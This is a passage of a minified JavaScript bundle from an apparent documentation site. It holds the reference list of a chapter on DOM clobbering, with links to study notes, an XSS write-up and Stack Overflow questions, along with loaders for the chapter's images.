back")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},"DOM Clobbering Attack\u5b66\u4e60\u8bb0\u5f55.md")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},"DOM Clobbering\u5b66\u4e60\u8bb0\u5f55")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering/"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable"},"Is there a spec that the id of elements should be made global variable?")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript"},"Why don't we just use element IDs as identifiers in JavaScript?")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables"},"Do DOM tree elements with ids become global variables?"))))}m.isMDXComponent=!0},3195:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/15-01-9d0ae7b83eca58a9e10cfe0543268273.png"},1012:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/15-02-57de123e33ca887fbee29b26f822617d.png"},7318:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/15-03-22deb60dd4591e032f7672becb75b144.png"},5042:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/15-04-8394bad6263cb93221d8a88c9de49769.png"},8768:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/15-05-5e028fd5d013ef7e39f4cb344bc5068f.png"}}]);